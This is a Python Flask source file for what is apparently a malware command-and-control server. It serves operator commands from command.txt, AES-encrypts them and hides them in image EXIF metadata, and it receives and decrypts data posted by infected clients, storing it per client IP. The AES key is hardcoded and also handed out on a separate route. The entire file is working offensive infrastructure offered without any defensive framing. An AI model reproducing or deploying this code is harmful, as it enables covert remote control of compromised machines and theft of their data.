from flask import Flask, request, jsonify, send_file
from werkzeug.wrappers import Request
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from base64 import b64encode, b64decode
import piexif
from PIL import Image

app = Flask(__name__)

# Pre-shared Key for AES Encryption
key_hex_str = '966b926de08c6c0bfd3811809cba8da1'
key = bytes.fromhex(key_hex_str)


def let_me_serve_you_bitch_lasagna(data, image_path='./image.png'):
    img = Image.open("./image.png")
    exif_dict = piexif.load(img.info["exif"])
    exif_dict["0th"][piexif.ImageIFD.ImageDescription] = data.encode()
    exif_bytes = piexif.dump(exif_dict)
    img.save(image_path, "jpeg", exif=exif_bytes)


@app.route('/hej_monika', methods=['GET'])
def monika():
    return key_hex_str, 200


@app.route('/ceiling_gang', methods=['GET'])
def get_command():
    client_ip = request.remote_addr
    print(f'Received request from {client_ip}')
    try:
        with open('command.txt', 'r') as file:
            content = file.read()
            # Encrypt the content before sending
            cipher = AES.new(key, AES.MODE_CBC)
            ct_bytes = cipher.encrypt(pad(content.encode(), AES.block_size))
            data = b64encode(cipher.iv + ct_bytes).decode('utf-8')

            let_me_serve_you_bitch_lasagna(data)

            return send_file('./image.png', mimetype='image/png')

    except FileNotFoundError:
        return 'commands.txt file does not exist', 404


@app.route('/floor_gang', methods=['POST'])
def save_data():
    client_ip = request.remote_addr
    print(f'Received request from {client_ip}')
    data = request.get_json()
    # Decrypt received data
    received = b64decode(data['content'])
    iv = received[:16]
    ct = received[16:]
    cipher_dec = AES.new(key, AES.MODE_CBC, iv)
    pt = unpad(cipher_dec.decrypt(ct), AES.block_size).decode()
    with open(f'{client_ip}_data.txt', 'w') as file:
        file.write(pt)
    return 'Data saved successfully', 200


if __name__ == "__main__":
    app.run(port=5000, debug=True)
